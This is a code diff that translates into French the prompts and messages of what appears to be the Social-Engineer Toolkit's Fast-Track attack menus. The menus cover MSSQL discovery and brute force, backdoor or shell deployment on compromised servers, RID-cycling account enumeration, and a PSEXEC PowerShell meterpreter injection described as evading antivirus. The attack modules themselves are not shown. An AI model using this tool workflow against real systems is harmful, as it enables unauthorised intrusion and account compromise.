@@ -42,29 +42,29 @@ try:
             #
             if attack_vector_sql == '1':
                 print(
-                    "\nHere you can select either a CIDR notation/IP Address or a filename\nthat contains a list of IP Addresses.\n\nFormat for a file would be similar to this:\n\n192.168.13.25\n192.168.13.26\n192.168.13.26\n\n1. Scan IP address or CIDR\n2. Import file that contains SQL Server IP addresses\n")
+                    "\nVous pouvez ici sélectionner soit une notation CIDR/adresse IP, soit un nom de fichier\ncontenant une liste d'adresses IP.\n\nLe format d'un fichier ressemblerait à ceci :\n\n192.168.13.25\n192.168.13.26\n192.168.13.26\n\n1. Scanner une adresse IP ou un CIDR\n2. Importer un fichier contenant des adresses IP de serveurs SQL\n")
                 choice = raw_input(
-                    setprompt(["19", "21", "22"], "Enter your choice (ex. 1 or 2) [1]"))
+                    setprompt(["19", "21", "22"], "Entrez votre choix (ex. 1 ou 2) [1]"))
                 if choice != "1":
                     if choice != "2":
                         if choice != "":
                             print_error(
-                                "You did not specify 1 or 2! Please try again.")
+                                "Vous n'avez pas indiqué 1 ou 2 ! Veuillez réessayer.")
                             choice = raw_input(
-                                setprompt(["19", "21", "22"], "Enter your choice (ex. 1 or 2) [1]"))
+                                setprompt(["19", "21", "22"], "Entrez votre choix (ex. 1 ou 2) [1]"))
                 # grab ip address
                 if choice == "":
                     choice = "1"
                 if choice == "1":
                     range = raw_input(setprompt(
-                        ["19", "21", "22"], "Enter the CIDR, single IP, or multiple IPs seperated by space (ex. 192.168.1.1/24)"))
+                        ["19", "21", "22"], "Entrez le CIDR, une IP unique, ou plusieurs IP séparées par des espaces (ex. 192.168.1.1/24)"))
                 if choice == "2":
                     while 1:
                         range = raw_input(setprompt(
-                            ["19", "21", "22"], "Enter filename for SQL servers (ex. /root/sql.txt - note can be in format of ipaddr:port)"))
+                            ["19", "21", "22"], "Entrez le nom du fichier des serveurs SQL (ex. /root/sql.txt - peut être au format ipaddr:port)"))
                         if not os.path.isfile(range):
                             print_error(
-                                "File not found! Please type in the path to the file correctly.")
+                                "Fichier introuvable ! Veuillez saisir correctement le chemin du fichier.")
                         else:
                             break
                 if choice == "1":
@@ -73,26 +73,26 @@ try:
                     port = "1433"
                 # ask for a wordlist
                 wordlist = raw_input(setprompt(
-                    ["19", "21", "22"], "Enter path to a wordlist file [use default wordlist]"))
+                    ["19", "21", "22"], "Entrez le chemin vers un fichier de liste de mots [liste par défaut]"))
                 if wordlist == "":
                     wordlist = "default"
                 # specify the user to brute force
                 username = raw_input(setprompt(
-                    ["19", "21", "22"], "Enter the username to brute force or specify username file (/root/users.txt) [sa]"))
+                    ["19", "21", "22"], "Entrez le nom d'utilisateur à forcer ou indiquez un fichier d'utilisateurs (/root/users.txt) [sa]"))
                 # default to sa
                 if username == "":
                     username = "sa"
                 if username != "sa":
                     if not os.path.isfile(username):
                         print_status(
-                            "If you were using a file, its not found, using text as username.")
+                            "Si vous utilisiez un fichier, il n'a pas été trouvé ; utilisation du texte comme nom d'utilisateur.")
                 # import the mssql module from fasttrack
                 from src.fasttrack import mssql
                 # choice from earlier if we want to use a filelist or whatnot
                 if choice != "2":
                     # sql_servers
                     sql_servers = ''
-                    print_status("Hunting for SQL servers.. This may take a little bit.")
+                    print_status("Recherche de serveurs SQL... Cela peut prendre un petit moment.")
                     if "/" or " " in str(range):
                         if "/" in str(range):
                             iprange = printCIDR(range)
@@ -128,12 +128,12 @@ try:
                     if not os.path.isfile(range):
                         while 1:
                             print_warning(
-                                "Sorry boss. The file was not found. Try again")
+                                "Désolé chef. Le fichier n'a pas été trouvé. Réessayez")
                             range = raw_input(setprompt(
-                                ["19", "21", "22"], "Enter the CIDR, single, IP, or file with IP addresses (ex. 192.168.1.1/24)"))
+                                ["19", "21", "22"], "Entrez le CIDR, une IP unique, ou un fichier d'adresses IP (ex. 192.168.1.1/24)"))
                             if os.path.isfile(range):
                                 print_status(
-                                    "Atta boy. Found the file this time. Moving on.")
+                                    "Bien joué. Le fichier a été trouvé cette fois. On continue.")
                                 break
 
                     fileopen = open(range, "r").readlines()
@@ -157,14 +157,14 @@ try:
                     sql_servers = sql_servers.split(",")
                     # start loop and brute force
 
-                    print_status("The following SQL servers and associated ports were identified:\n")
+                    print_status("Les serveurs SQL suivants et leurs ports associés ont été identifiés :\n")
                     for sql in sql_servers:
                         if sql != "":
                             print(sql)
 
                     if len(sql_servers) > 2:
-                        print_status("By pressing enter, you will begin the brute force process on all SQL accounts identified in the list above.")
-                        test = input("Press {enter} to begin the brute force process.")
+                        print_status("En appuyant sur entrée, vous démarrerez le bruteforce sur tous les comptes SQL identifiés dans la liste ci-dessus.")
+                        test = input("Appuyez sur {entrée} pour démarrer le bruteforce.")
                     for servers in sql_servers:
 
                         # this will return the following format ipaddr + "," +
@@ -199,13 +199,13 @@ try:
                 if counter == 0:
                     if sql_servers:
                         print_warning(
-                            "Sorry. Unable to locate or fully compromise a MSSQL Server on the following SQL servers: ")
+                            "Désolé. Impossible de localiser ou de compromettre entièrement un serveur MSSQL parmi les serveurs SQL suivants : ")
 
                     else:
                         print_warning(
-                            "Sorry. Unable to find any SQL servers to attack.")
+                            "Désolé. Aucun serveur SQL à attaquer n'a été trouvé.")
                     pause = raw_input(
-                        "Press {return} to continue to the main menu.")
+                        "Appuyez sur {entrée} pour revenir au menu principal.")
                 # if we successfully attacked one
                 if counter == 1:
                     # need to loop to keep menu going
@@ -215,12 +215,12 @@ try:
                         # here we list the servers we compromised
                         master_names = master_list.split(":")
                         print_status(
-                            "SET Fast-Track attacked the following SQL servers: ")
+                            "SET Fast-Track a attaqué les serveurs SQL suivants : ")
                         for line in sql_servers:
                             if line != "":
                                 print("SQL Servers: " + line.rstrip())
                         print_status(
-                            "Below are the successfully compromised systems.\nSelect the compromise SQL server you want to interact with:\n")
+                            "Voici les systèmes compromis avec succès.\nSélectionnez le serveur SQL compromis avec lequel vous voulez interagir :\n")
                         for success in master_names:
                             if success != "":
                                 success = success.rstrip()
@@ -231,10 +231,10 @@ try:
                                 # increment counter
                                 counter = counter + 1
 
-                        print("\n   99. Return back to the main menu.\n")
+                        print("\n   99. Retour au menu principal.\n")
                         # select the server to interact with
                         select_server = raw_input(
-                            setprompt(["19", "21", "22"], "Select the SQL server to interact with [1]"))
+                            setprompt(["19", "21", "22"], "Sélectionnez le serveur SQL avec lequel interagir [1]"))
                         # default 1
                         if select_server == "quit" or select_server == "exit":
                             break
@@ -252,9 +252,9 @@ try:
                                 # ipaddr + "," + username + "," + str(port) +
                                 # "," + passwords
                                     print(
-                                        "\nHow do you want to deploy the binary via debug (win2k, winxp, win2003) and/or powershell (vista,win7,2008,2012) or just a shell\n\n   1. Deploy Backdoor to System\n   2. Standard Windows Shell\n\n   99. Return back to the main menu.\n")
+                                        "\nComment voulez-vous déployer le binaire : via debug (win2k, winxp, win2003) et/ou powershell (vista, win7, 2008, 2012), ou juste un shell\n\n   1. Déployer une porte dérobée sur le système\n   2. Shell Windows standard\n\n   99. Retour au menu principal.\n")
                                     option = raw_input(
-                                        setprompt(["19", "21", "22"], "Which deployment option do you want [1]"))
+                                        setprompt(["19", "21", "22"], "Quelle option de déploiement voulez-vous [1]"))
                                     if option == "":
                                         option = "1"
                                     # if 99 then break
@@ -284,19 +284,19 @@ try:
             #
             if attack_vector_sql == "2":
                 sql_server = raw_input(setprompt(
-                    ["19", "21", "23"], "Enter the hostname or IP address of the SQL server"))
+                    ["19", "21", "23"], "Entrez le nom d'hôte ou l'adresse IP du serveur SQL"))
                 sql_port = raw_input(
-                    setprompt(["19", "21", "23"], "Enter the SQL port to connect [1433]"))
+                    setprompt(["19", "21", "23"], "Entrez le port SQL de connexion [1433]"))
                 if sql_port == "":
                     sql_port = "1433"
                 sql_username = raw_input(
-                    setprompt(["19", "21", "23"], "Enter the username of the SQL Server [sa]"))
+                    setprompt(["19", "21", "23"], "Entrez le nom d'utilisateur du serveur SQL [sa]"))
                 # default to sa
                 if sql_username == "":
                     sql_username = "sa"
                 sql_password = raw_input(
-                    setprompt(["19", "21", "23"], "Enter the password for the SQL server"))
-                print_status("Connecting to the SQL server...")
+                    setprompt(["19", "21", "23"], "Entrez le mot de passe du serveur SQL"))
+                print_status("Connexion au serveur SQL...")
                 # try connecting
                 # establish base counter for connection
                 counter = 0
@@ -307,18 +307,18 @@ try:
                     counter = 1
                 except Exception as e:
                     print(e)
-                    print_error("Connection to SQL Server failed. Try again.")
+                    print_error("La connexion au serveur SQL a échoué. Réessayez.")
                 # if we had a successful connection
                 if counter == 1:
                     print_status(
-                        "Dropping into a SQL shell. Type quit to exit.")
+                        "Ouverture d'un shell SQL. Tapez quit pour sortir.")
                     # loop forever
                     while 1:
                         # enter the sql command
-                        sql_shell = raw_input("Enter your SQL command here: ")
+                        sql_shell = raw_input("Entrez votre commande SQL ici : ")
                         if sql_shell == "quit" or sql_shell == "exit":
                             print_status(
-                                "Exiting the SQL shell and returning to menu.")
+                                "Fermeture du shell SQL et retour au menu.")
                             break
 
                         try:
@@ -335,7 +335,7 @@ try:
                                 print(data)
                         except Exception as e:
                             print_warning(
-                                "\nIncorrect syntax somewhere. Printing error message: " + str(e))
+                                "\nSyntaxe incorrecte quelque part. Affichage du message d'erreur : " + str(e))
 
         #
         #
@@ -348,7 +348,7 @@ try:
                         text.fasttrack_exploits_menu1)
             # enter the exploits menu here
             range = raw_input(
-                setprompt(["19", "24"], "Select the number of the exploit you want"))
+                setprompt(["19", "24"], "Sélectionnez le numéro de l'exploit que vous voulez"))
 
             # ms08067
             if range == "1":
@@ -426,16 +426,16 @@ try:
                 |______|
 """)
             print(
-                "\nRID_ENUM is a tool that will enumerate user accounts through a rid cycling attack through null sessions. In\norder for this to work, the remote server will need to have null sessions enabled. In most cases, you would use\nthis against a domain controller on an internal penetration test. You do not need to provide credentials, it will\nattempt to enumerate the base RID address and then cycle through 500 (Administrator) to whatever RID you want.")
+                "\nRID_ENUM est un outil qui énumère les comptes utilisateurs via une attaque de cycling de RID à travers des sessions nulles.\nPour que cela fonctionne, le serveur distant doit avoir les sessions nulles activées. Dans la plupart des cas, on\nutilise ceci contre un contrôleur de domaine lors d'un test d'intrusion interne. Vous n'avez pas besoin de fournir\nd'identifiants, l'outil tentera d'énumérer l'adresse RID de base puis de parcourir de 500 (Administrateur) jusqu'au RID souhaité.")
             print("\n")
             ipaddr = raw_input(
-                setprompt(["31"], "Enter the IP address of server (or quit to exit)"))
+                setprompt(["31"], "Entrez l'adresse IP du serveur (ou quit pour sortir)"))
             if ipaddr == "99" or ipaddr == "quit" or ipaddr == "exit":
                 break
             print_status(
-                "Next you can automatically brute force the user accounts. If you do not want to brute force, type no at the next prompt")
+                "Vous pouvez ensuite forcer automatiquement les comptes utilisateurs. Si vous ne voulez pas le faire, tapez no à la prochaine invite")
             dict = raw_input(setprompt(
-                ["31"], "Enter path to dictionary file to brute force [enter for built in]"))
+                ["31"], "Entrez le chemin du fichier dictionnaire pour le bruteforce [entrée pour celui intégré]"))
             # if we are using the built in one
             if dict == "":
                 # write out a file
@@ -447,37 +447,37 @@ try:
 
             # if we are not brute forcing
             if dict.lower() == "no":
-                print_status("No problem, not brute forcing user accounts")
+                print_status("Aucun problème, pas de bruteforce sur les comptes utilisateurs")
                 dict = ""
 
             if dict != "":
                 print_warning(
-                    "You are about to brute force user accounts, be careful for lockouts.")
+                    "Vous êtes sur le point de forcer les comptes utilisateurs, attention aux verrouillages de compte.")
                 choice = raw_input(
-                    setprompt(["31"], "Are you sure you want to brute force [yes/no]"))
+                    setprompt(["31"], "Êtes-vous sûr de vouloir lancer le bruteforce [yes/no]"))
                 if choice.lower() == "n" or choice.lower() == "no":
                     print_status(
-                        "Okay. Not brute forcing user accounts *phew*.")
+                        "D'accord. Pas de bruteforce sur les comptes utilisateurs *ouf*.")
                     dict = ""
 
             # next we see what rid we want to start
             start_rid = raw_input(
-                setprompt(["31"], "What RID do you want to start at [500]"))
+                setprompt(["31"], "À quel RID voulez-vous commencer [500]"))
             if start_rid == "":
                 start_rid = "500"
             # stop rid
             stop_rid = raw_input(
-                setprompt(["31"], "What RID do you want to stop at [15000]"))
+                setprompt(["31"], "À quel RID voulez-vous arrêter [15000]"))
             if stop_rid == "":
                 stop_rid = "15000"
             print_status(
-                "Launching RID_ENUM to start enumerating user accounts...")
+                "Lancement de RID_ENUM pour commencer l'énumération des comptes utilisateurs...")
             subprocess.Popen("python src/fasttrack/ridenum.py %s %s %s %s" %
                              (ipaddr, start_rid, stop_rid, dict), shell=True).wait()
 
             # once we are finished, prompt.
-            print_status("Everything is finished!")
-            pause = raw_input("Press {return} to go back to the main menu.")
+            print_status("Tout est terminé !")
+            pause = raw_input("Appuyez sur {entrée} pour revenir au menu principal.")
 
         #
         #
@@ -486,7 +486,7 @@ try:
         #
         if attack_vector == "6":
             print(
-                "\nPSEXEC Powershell Injection Attack:\n\nThis attack will inject a meterpreter backdoor through powershell memory injection. This will circumvent\nAnti-Virus since we will never touch disk. Will require Powershell to be installed on the remote victim\nmachine. You can use either straight passwords or hash values.\n")
+                "\nAttaque par injection PowerShell PSEXEC :\n\nCette attaque injecte une porte dérobée meterpreter via une injection mémoire PowerShell. Cela permet de contourner\nl'antivirus puisque le disque n'est jamais touché. Nécessite que PowerShell soit installé sur la machine victime\ndistante. Vous pouvez utiliser soit des mots de passe en clair, soit des valeurs de hash.\n")
             try:
                 module_reload(src.fasttrack.psexec)
             except:
